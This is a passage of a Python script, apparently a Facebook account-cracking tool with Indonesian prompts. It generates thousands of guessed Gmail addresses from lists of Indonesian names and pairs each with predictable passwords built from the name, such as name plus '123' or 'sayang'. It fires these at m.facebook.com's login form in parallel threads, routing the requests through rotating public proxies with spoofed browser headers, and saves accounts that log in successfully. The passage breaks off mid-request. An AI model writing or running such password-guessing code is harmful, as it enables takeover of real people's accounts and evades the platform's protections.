'rosita', 'rosalina', 'rossalina', 'rosmanah', 'rum', 'rumaidah', 'ruwaidah', 'ryzka','sadiya', 'sabira', 'sabhira', 'sahara', 'saharah', 'sahla', 'saleha', 'saila', 'salima', 'salimah', 'sabha', 'sabrina', 'safa', 'saffa', 'safna', 'safira', 'saidah', 'sahira', 'sakila', 'sakinah', 'sakira', 'salma', 'salmaira', 'salsa', 'salsabila', 'salsabilla', 'salsabylla', 'salwa', 'santi', 'sani', 'santy', 'santika', 'sara', 'shafira', 'shavira', 'shakira', 'shalina', 'shafna', 'shafana', 'shaleha', 'shalehah', 'shakeera', 'shakila', 'shalihah', 'shanti', 'shanty', 'shantika', 'shani', 'shaniyah', 'shofy', 'shofiyah', 'shofiyyah', 'sholeha', 'sholehah', 'sifa', 'silawati', 'sipa', 'silpi', 'silvi', 'siska', 'sinta', 'suci', 'selly', 'safitri', 'saputri', 'sarah', 'saras', 'sarasvati', 'saraswati', 'sari', 'sasmita', 'setiawati', 'sisil', 'siti', 'sity', 'siregar', 'simanjuntak', 'solha', 'solehah', 'sonia', 'soraya', 'sukma', 'suci', 'sumi', 'sumiyati', 'suraya', 'suraiya', 'suratni', 'surtini', 'suratmi', 'sasanti', 'susanty', 'susi', 'susilawati', 'susilawaty', 'susy', 'sutari', 'suteni', 'susu', 'syafaa', 'syakila', 'syakira', 'syifa', 'sypa', 'sya', 'syahla', 'syahira', 'syafira', 'syavira','tabita', 'tabhita', 'tahira', 'tahiya', 'tahiyyah', 'talea', 'talia', 'taliah', 'talita', 'talitha', 'tami', 'tamimah', 'tammy', 'tania', 'tannia', 'taniya', 'tari', 'tarisa', 'tarissa', 'tasya', 'taskia', 'taskiya', 'taskya', 'tazkia', 'tazkiya', 'tazkya', 'tesa', 'tessa', 'tea', 'thea', 'thiara', 'tia', 'tiaa', 'tias', 'tiastuti', 'tiara', 'tifani', 'tifany', 'tifanni', 'tifanny', 'tiffani', 'tika', 'tina','tita', 'titian', 'titi', 'titie', 'titisari', 'titin', 'tri', 'tria', 'triani', 'tsabitah', 'tsunade', 'tusilawati', 'tuti', 'tya', 'tiktok', 'tikotok', 'tyz', 'tzy','uci', 'uchi', 'ufaira', 'ufairah', 'ulfa', 'ulfaqiha', 'ulan', 'ullan', 'ulandari', 'ulandary', 'ulima', 'ulia', 'uliya', 'ulya', 'ulpah', 'ulpa', 'ulva', 'umayah', 'umi', 'umy', 'ummi', 'ummy', 'umiyah', 'umiati', 'umiaty', 'umiyati', 'utami', 'utari', 'ute', 'ubaidah', 'umaira', 'umairah', 'usna', 'usnah', 'uswah', 'uswatun', 'uswatunhasanah', 'uzwatun','va', 'vaa', 'vani', 'vaeda', 'vanni', 'vania', 'vannia', 'vaniya', 'vanniya', 'vany', 'vanya', 'valen', 'vallen', 'valentina', 'vallentina', 'valeria', 'vanesa', 'vannesa', 'vanda', 'vardah', 'vahira', 'vazza', 'verda', 'vera', 'victoria', 'viktoria', 'via', 'vina', 'vinna', 'vivi', 'vivie', 'vianita', 'viviana', 'viena', 'viola', 'vivianna', 'vida', 'vio', 'violet', 'violetta', 'veronica', 'veronika', 'viani', 'vianika', 'viane', 'verona', 'viana', 'viera', 'valencia', 'valensia', 'viata', 'vira', 'virania', 'vita', 'vitta', 'vitaloka', 'velma', 'vilmei', 'vega', 'viona', 'visi','wafa', 'wafda', 'wafiyah', 'wahdah', 'waheeda', 'wardani', 'wardhani', 'wahdaniyah', 'wahidah', 'wanda', 'wangi', 'wardah', 'wasfa', 'washfa', 'wasiah', 'wasimah', 'wasiyah', 'wastiqah', 'wati', 'watiah', 'watilah', 'watiyah', 'watsiqah', 'wasikoh', 'welas', 'wening', 'widi', 'widia', 'widhia', 'widhiya', 'widiya', 'widiasari', 'widiawat', 'widy', 'wikayah', 'wilona', 'willona', 'windi', 'windiawati', 'windiasari', 'wina', 'wini', 'wirastuti', 'wiqayah', 'wikoyah', 'wiwin', 'windy', 'wulan', 'wulandari','xxx', 'xnxx', 'xyz', 'xyzz','tzy','tyz', 'mojang', 'gemoy','imut','kebi','cabi','tembem','cantik','cans','canss','gelis','geulis','ytta','kasep','ganteng','wibu','gojo','gojosatoru','santik', 'gerengseng', 'bokep', 'ewe', 'xtc', 'brigez', 'garutpride', 'bandungpride', 'sundapride', '1', '2', '3', '4', '5', '6', '7', '8', '9', '01', '02', '03', '04', '05', '06', '07', '08', '09', '010', '00', '99', '999', '000', '0000', '12', '123', '1234', '12345', '123456', 'bandung', 'banung', 'sukabumi', 'tasik', 'tasikmalaya', 'toblong', 'peundeuy', 'singajaya', 'pameungpeuk', 'cibalong', 'pamempek', 'simpang', 'cisompet', 'banyarwangi', 'cinangsi', 'cisurupan', 'saribakti', 'cikajang','yani', 'yanti', 'yanti', 'yanty', 'yasira', 'yeni', 'ytta', 'yuli', 'yulli', 'yulia', 'yuliya', 'yulya', 'yully', 'yulianti', 'yuliyanti', 'yusria', 'yusriah', 'yusrina', 'yuni', 'yunita', 'yuningsih', 'yuyu', 'yuyun','zahra', 'zafira', 'zafirah', 'zahira', 'zahirah', 'zahiyah', 'zahra', 'zahrani', 'zahrany', 'zahwa', 'zaidah', 'zainab', 'zainnab', 'zairah', 'zaitun', 'zakiah', 'zakyah', 'zakiyyah', 'zenab', 'zennab', 'zalfa', 'zalpa', 'zalva', 'zalsa', 'zannah', 'zara', 'zariah', 'zaskia', 'zaskiya', 'zaskya', 'zaskiani', 'zaskiyani', 'zizah', 'zaynah', 'zayanah', 'zayyanah', 'zenia', 'zera', 'zhafira', 'zhafirah', 'zharifa', 'zharifah', 'zia', 'zizi', 'zyzy', 'zubaidah', 'zuhrah', 'zulfa', 'zulpa', 'zulva', 'zunaira', 'zunea', 'zunnea','aceh', 'indonesia', 'konoha', 'bali', 'cilegon', 'serang', 'tangerang', 'jakarta', 'jambi', 'bandung', 'bekasi', 'bogor', 'cimahi', 'cirebon', 'depok', 'sukabumi', 'tasik', 'tasikmalaya', 'banjar', 'magelang', 'pekalongan', 'semarang', 'surakarta', 'tegal', 'garut', 'blitar', 'kediri', 'madiun', 'malang', 'mojokerto', 'pasuruan', 'surabaya', 'batam', 'lampung', 'bima', 'mataram', 'kupang', 'bali', 'ntt', 'ntb', 'sorong', 'jayapura', 'maluku', 'papua', 'dumai', 'riau', 'pekanbaru', 'sumatra', 'sulawesi', 'makassar', 'kalimanta','kalimantan', 'bitung', 'manado', 'bukittinggi', 'padang', 'palembang', 'binjai', 'medan', 'padang', 'pematangsiantar', 'sibolga', 'tebingtinggi']
	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25','asilah', 'asti', 'astiani', 'astiyani', 'astuti', 'atik', 'atika', 'atikah', 'ayg', 'ayank', 'ayang', 'ayra', 'ayu', 'ayyu', 'ayunda', 'ayuni', 'ayudia', 'ayudiya', 'ayudiah', 'ayuningsih', 'azzahra', 'azijah', 'azizah', 'azmi', 'azmy', 'azura','babi', 'baby', 'badriah', 'bajingan', 'bagong', 'bandung', 'bngst', 'bangsat', 'bela', 'bella', 'bibah', 'bila', 'billa', 'belinda', 'betharia', 'bintang', 'briana', 'britania', 'briela', 'briyana', 'budiarti', 'bulan', 'bunga', 'bungsu', 'bunyamin', 'butet','ca', 'cabi', 'cabhy', 'caby', 'cabby', 'caca', 'cca', 'cahaya', 'cahya', 'cahyani', 'cahyaningsih', 'caitlyn', 'camelia', 'cangcut', 'can', 'cans', 'canss', 'cantik', 'cantika', 'caroline', 'charrisa', 'catherine', 'cassandra', 'celine', 'cecilia', 'celsi', 'celsie', 'centil', 'chaca', 'chacha', 'chelsi', 'chelsie', 'chelsea', 'chesi', 'chessy', 'chika', 'cia', 'cci', 'cici', 'cika', 'cimok', 'cindy', 'cinta', 'cintia', 'cintaku', 'cintya', 'cintiya', 'citra', 'chindy', 'claudya', 'cucu', 'ccu', 'culun', 'cupu', 'cynthia', 'cyntia','dafin', 'dahlia', 'daiba', 'dania', 'daniah', 'daniyah', 'danyyah', 'daswita', 'dara', 'davina', 'darsie', 'dawy', 'de', 'dea', 'dede', 'dela', 'della', 'delia', 'delicia', 'denia', 'deniah', 'deniyah', 'deon', 'debi', 'deby', 'debby', 'denita', 'denisa', 'devi', 'devia', 'devie', 'desnia', 'desnie', 'divita', 'desi', 'desita', 'deswita', 'dewandana', 'dwi', 'dewi', 'dewita', 'dhairya', 'dhara', 'dhe', 'dhea', 'dheniah', 'dhewi', 'dhita', 'dhiya', 'dia', 'diah', 'diajeng', 'dian', 'diana', 'diandra', 'diannova', 'dias', 'diinah', 'dika', 'diksa', 'dila', 'dilla', 'dipa', 'diva', 'dianda', 'dila', 'dilla', 'dira', 'dina', 'dinda', 'dini', 'diniah', 'diniyah', 'disa', 'disha', 'dita', 'divya', 'dixha', 'diya', 'diyah', 'diyara', 'dnya', 'dona', 'dyra', 'dyah', 'dzafina', 'djakarta','eka', 'elailah', 'elaina', 'eira', 'eisha', 'elaina', 'elda', 'elea', 'elena', 'eleanor', 'eleanoer', 'eleha', 'eletha', 'elfie', 'elga', 'elia', 'eliana', 'elicia', 'elika', 'elin', 'elina', 'elisabeth', 'elis', 'ellis', 'elise', 'eliya', 'eliza', 'elizabeth', 'ella', 'ellen', 'elliana', 'ellie', 'elma', 'elmira', 'elora', 'elisa', 'elisha', 'elisia', 'elisiya', 'elisya', 'elisyha', 'elsye', 'elfina', 'elsa', 'evi', 'epi', 'elisabeth', 'elin', 'elsy', 'elva', 'elvira', 'elly' 'elvina', 'elzahra', 'embun', 'emeline', 'ekavira', 'emery', 'emi', 'emilia', 'emy', 'emyliya', 'ema', 'emma', 'emily', 'emira', 'endah', 'endang', 'epi', 'erna', 'erni', 'eri', 'erika', 'erina', 'erlinda', 'esti', 'estiana', 'eis', 'eti', 'etie', 'ety', 'euis', 'eva', 'evi', 'evita', 'evitamala', 'evalina', 'evelyn', 'ewe','fara', 'farah', 'farrah', 'fadila', 'fadla', 'fadhila', 'fadhla', 'faija', 'faiza', 'faizza', 'faizah', 'fani', 'fanni', 'fany', 'fanny', 'fanya', 'farhah', 'farhana', 'farida', 'faridha', 'fasya', 'fasha', 'fathia', 'fatin', 'fatina', 'fatthyyah', 'faujia', 'faujiah', 'fauzia', 'fauziah', 'fauziya', 'fauzyah', 'fawziyah', 'fazila', 'fazilla', 'fazeela', 'fatim', 'fatima', 'fatimah', 'fathimah', 'felisia', 'felisya', 'ferli', 'ferly', 'ferlyani', 'fika', 'fina', 'fiona', 'fionna', 'fida', 'fira', 'firli', 'firly', 'firlly', 'firliani', 'firliyani', 'fita', 'fitri', 'fitriani', 'fitriyani', 'fitryani', 'fiska', 'fizka', 'fiza', 'frisilia', 'frisiliya', 'freya', 'friska', 'fuji', 'fuzi','gabriella', 'gaby', 'gabby', 'garut', 'gadis', 'geby', 'gebby', 'gelsey', 'gendis', 'gemma', 'georgia', 'gloria', 'gea', 'ghwa', 'gia', 'ghia', 'ghina', 'ghita"', 'gina', 'ginna', 'gisela', 'gisella', 'gita', 'gitta', 'grace', 'gracia','grachelyn','gracheline', 'graciella', 'greta', 'gresia', 'gresik', 'glenda', 'gloria', 'giska', 'greta', 'ganesha', 'geisha', 'genta', 'gwendolyn','habibah', 'harika', 'hafsa', 'halima', 'halia', 'halimah', 'hafiza', 'hafsah', 'hafiza', 'hafizah', 'hana', 'handayani', 'handayanti', 'hanna', 'hannah', 'hani', 'hany', 'hanny', 'hanifah', 'hanipah', 'haila', 'hayla', 'hania', 'haniya', 'hartini', 'hasanah', 'hatima', 'hatimah', 'hilda', 'hilma', 'hilmawati', 'hiya', 'helen', 'helena', 'hellen', 'helia', 'helin', 'helina', 'hemalia', 'hepti', 'hesa', 'hessa', 'hesha', 'hesti', 'hestia', 'hesty', 'helga', 'hasna', 'hinata', 'hikmat', 'hopi', 'hopipah', 'hoho', 'hotima', 'hotimah', 'hikmah', 'humaida', 'humayda', 'husna', 'hurairah','ica', 'icaa', 'icha', 'ichaa', 'ida', 'ifa', 'iffa', 'ilmira', 'ina', 'inna', 'inaara', 'inara', 'inarah', 'inayah', 'indah', 'indira', 'indyra', 'indri', 'indry', 'insan', 'insani', 'imelda', 'ina', 'irma', 'irena', 'ika', 'ijah', 'intan', 'intanrahayu', 'ira', 'isabela', 'isabella', 'isan', 'isana', 'isyana', 'isah', 'isma', 'ismawati', 'ismawaty', 'ismi', 'ismiya', 'ismiyati', 'isnaen', 'isnaeni', 'isni', 'iza', 'izah', 'izna', 'iysha','jafira', 'jahira', 'jalilah', 'jahra', 'jamilah', 'janeta', 'jameela', 'jannah', 'janita', 'jasmin', 'jasmine', 'jayanti', 'jelita', 'jeni', 'jeny', 'jenny', 'jennifer', 'jenita', 'jennita', 'jesica', 'jesicca', 'jesika', 'jihan', 'jihana', 'jingga', 'juwita', 'juli', 'julia', 'juliana', 'juliet', 'jumaina', 'jumainah', 'juniarti', 'junaina', 'juwitta', 'jwita','kaila', 'kalia', 'kaira', 'khaira', 'karin', 'karina', 'kartika', 'kadek', 'kania', 'kaniya', 'kartini', 'kasih', 'kamala', 'kamila', 'karima', 'karomah', 'karisa', 'karissa', 'karsih', 'katrina', 'keira', 'khaira', 'khaila', 'khafifah', 'khadijah', 'khairun', 'khairunisa', 'khalifah', 'khalilah', 'khabirah', 'khatimah', 'khofiroh', 'khopipah', 'kiki', 'kim', 'kiara', 'kila', 'killa', 'kira', 'kirani', 'komarudin', 'kumala', 'kumalasari', 'kokom', 'komala', 'komalasari', 'komalawati', 'kontol', 'kotima', 'kotimah', 'kulsum', 'kultsum', 'kuntul', 'kurnia', 'kurniati', 'kurniyati', 'kursina', 'kurniasih', 'kusina', 'kusmiati', 'kusmiyai','laela', 'laesa', 'lady', 'lafiza', 'lala', 'laila', 'lati', 'laty', 'latifah', 'lathifah', 'layla', 'lara', 'laras', 'larasati', 'lasmini', 'laura', 'laudia', 'laudya', 'leila', 'lela', 'lesmana', 'lesmana', 'lena', 'leni', 'lenka', 'leny', 'lenny', 'lestari', 'lestarty', 'lesti', 'lesty', 'levita', 'lia', 'lida', 'lidia', 'lidya', 'liana', 'liani', 'lilis', 'lina', 'linda', 'lintang', 'lis', 'lisa', 'lisha', 'lisna', 'lisnawati', 'lisnawaty', 'listi', 'listy', 'listia', 'listya', 'liza', 'liya']
	global ok , cc
	nama = input(f'{H}──>{P}USERNAME : ')
	if ',' in str(nama):
		print(f' {P}──>{J} masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = '@gmail.com'
	jumlah = '5000'
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		sys.stdout.write(f"{H}\r──>{P}BERHASIL MENGUMPULKAN GMAIL  {H}{len(id)}{P} GMAIL....{P}")
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:passwrd()
	atur_id()
#----------[ CRACK FILE ]----------#
def crackfile():
	try:
		fileX = input (f'{P}[{H}──>{P}] Masukan File Anda : ')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		atur_id()
	except IOError:
		exit(f" {P}──>{J} ID ERROR {H}%s {J}not found"%(fileX))
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('ZAXXY-OK')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}──>{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}──>{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('ZAXXY-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──>{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──>{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('ZAXXY-OK/'+geh,'r').read().splitlines()
		except:
		    exit(f"{kun}──>{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		input(f'{kun}──>{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('ZAXXY-CP')
	except FileNotFoundError:
		exit(f"{kun}──>{mer} File tidak di temukan ")
	if len(vin)==0:
		exit(f"{kun}──>{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('ZAXXY-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}──>{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}──>{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		geeh = input(f'{biru}──>{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    exit(f"{biru}──>{mer} Pilih yang bener :-( ")
		try:lin = open('ZAXXY-CP/'+geh,'r').read().splitlines()
		except:
		    exit(f"{biru}──>{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		input(f'{kun}──>{mer} Klik Enter {kun}]')
		menu()
																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	print("")
	print(f'{biru}──>{puti} 1.Asnyc({hijo}Recomend{puti}) ')
	print(f'{biru}──>{puti} 2.Asnyc({hijo}Recomend{puti}) ')	      
	ZAXXY_METHODE = input(f'{biru}──>{puti} Input method : ')
	if ZAXXY_METHODE in ['1','01']:
	   method.append('zaxy')
	if ZAXXY_METHODE in ['2','02']:
	   method.append('zax2')  
	else:
		method.append('zaxy')
	print(f'{biru}──>{puti} TAMBAHKAN PASSWORD MANUAL (Y/T)/KETIK (T) SAJA ')	
	passwtamb = input(f'{biru}──>{puti} Input : ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     sandiku = input(f'{kun}──>{puti} INPUT PASSWORD : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	print(f'{biru}──>{puti} Usahakan mode pesawat 300 gmail ')
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'123456')
						pwx.append(frestile+'123456789')
						pwx.append(frestile+'sayang')
						pwx.append(frestile+'321')
						pwx.append(frestile+'2020')
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'123456')
						pwx.append(frestile+'123456789')
						pwx.append(frestile+'sayang')
						pwx.append(frestile+'321')
						pwx.append(frestile+'2020')
						
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'zaxy' in method:
				    pemuda_tersakiti.submit(crackapi,idf,pwx,'m.facebook.com')
				if 'zax2' in method:
				    pemuda_tersakiti.submit(apicrack,idf,pwx,'m.facebook.com')
				    
	print(f'{kun}──>{puti} OK {hijo}: %s'%(ok))
	print(f'{kun}──>{puti} CP {kun}: %s'%(cp))
	print(f"{biru}──>{puti}")
	
#----------[ METODE-ASYNC ]----------#	
def crackapi(idf,pwx,url):
  global loop,ok,cp
  ses = requests.Session()
  rr = random.randint
  rc = random.choice
  prog.update(des,description=f"{h}Asnyc{x} {loop}/{len(id)} OK-:[bold cyan]{ok}[/] CP-:[bold yellow]{cp}[/]")
  prog.advance(des)
  for pw in pwx:
    try:
      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
      open('http.txt','w').write(proxs)
      nip = rc(proxs)
      proxs = {'http': 'socks4://'+nip}
      ua = rc(ugen)
      ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
      link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=629274312371363&kid_directed_site=0&app_id=629274312371363&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D629274312371363%26cbt%3D1717747637996%26e2e%3D%257B%2522init%2522%253A1717747637996%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dea9a9761-d2e0-4cde-83d7-78d3d7116502%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.storymatrix.drama%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D9VpwzgSW1GDZHkN4P1L8pZAnzjBeKxwjGs8UokpZ_Ms%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D59c73c85-c5d0-4b9c-b2c6-323952eb4601%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.storymatrix.drama%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
      date = {
      'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
      'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
      'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
      'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
      'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
      'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
      'email': idf,
      'pass': pw,
      'login': 'Masuk',
      'bi_xrwh': '0',
        }
      head = {
      'Host': url,
      'content-length': '2171',
      'sec-ch-ua': 'Not-A.Brand;v=99, Chromium;v=124',
      'sec-ch-ua-mobile': '?1',
      'user-agent': ua,
      'content-type': 'application/x-www-form-urlencoded',
      'x-fb-lsd': 'AVo7ni49ePk',
      'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
      'x-asbd-id': '129477',
      'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
      'sec-ch-ua-model': 'CPH1923',
      'sec-ch-prefers-color-scheme': 'dark',
      'sec-ch-ua-platform': 'Android',
      'accept': '*/*',
      'origin': f'https://'+url,
      'sec-fetch-site': 'same-origin',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=629274312371363&kid_directed_site=0&app_id=629274312371363&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D629274312371363%26cbt%3D1717747637996%26e2e%3D%257B%2522init%2522%253A1717747637996%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dea9a9761-d2e0-4cde-83d7-78d3d7116502%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.storymatrix.drama%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D9VpwzgSW1GDZHkN4P1L8pZAnzjBeKxwjGs8UokpZ_Ms%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D59c73c85-c5d0-4b9c-b2c6-323952eb4601%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.storymatrix.drama%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
      params = {'api_key': '629274312371363','auth_token': '814eea949fabcef2ea98e625e85fca7f','skip_api_login': '1','signed_next': '1','next': 'https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=629274312371363&cbt=1717747637996&e2e=%7B%22init%22%3A1717747637996%7D&ies=1&sdk=android-13.0.0&sso=chrome_custom_tab&nonce=ea9a9761-d2e0-4cde-83d7-78d3d7116502&scope=public_profile%2Cemail%2Copenid&state=%7B%220_auth_logger_id%22%3A%2259c73c85-c5d0-4b9c-b2c6-323952eb4601%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22j5t5t0o4lccb5iq9qvd3%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.storymatrix.drama&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=9VpwzgSW1GDZHkN4P1L8pZAnzjBeKxwjGs8UokpZ_Ms&ret=login&fbapp_pres=0&logger_id=59c73c85-c5d0-4b9c-b2c6-323952eb4601&tp=unspecified','refsrc': 'deprecated','app_id': '629274312371363','cancel': 